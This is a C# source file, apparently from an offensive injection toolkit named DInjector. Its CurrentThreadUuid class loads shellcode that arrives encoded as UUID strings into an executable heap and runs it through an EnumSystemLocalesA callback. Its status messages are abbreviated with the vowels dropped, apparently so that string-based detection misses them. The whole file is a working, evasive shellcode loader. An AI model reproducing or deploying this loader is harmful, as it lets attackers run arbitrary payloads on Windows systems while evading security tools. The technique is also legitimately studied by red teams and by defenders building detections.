using System;

namespace DInjector
{
    class CurrentThreadUuid
    {
        public static void Execute(string shellcode, bool debug = false)
        {
            #region HeapCreate

            var hHeap = Win32.HeapCreate((uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero);

            if (hHeap != null)
                Console.WriteLine("(CurrentThreadUuid) [+] HpCrt");
            else
                throw new Exception("(CurrentThreadUuid) [-] HpCrt: " + hHeap.ToString("x2"));

            #endregion

            #region UuidFromStringA

            var uuids = shellcode.Split('|');
            IntPtr heapAddress = IntPtr.Zero;

            for (int i = 0; i < uuids.Length; i++)
            {
                heapAddress = IntPtr.Add(hHeap, 16 * i);
                _ = Win32.UuidFromStringA(uuids[i], heapAddress);
            }

            Console.WriteLine("(CurrentThreadUuid) [+] UdFrmStrngA");

            #endregion

            #region EnumSystemLocalesA

            var result = Win32.EnumSystemLocalesA(hHeap, 0);

            if (result)
                Console.WriteLine("(CurrentThreadUuid) [+] EnmSstmLclsA");
            else
                throw new Exception("(CurrentThreadUuid) [-] EnmSstmLclsA");

            #endregion
        }
    }
}
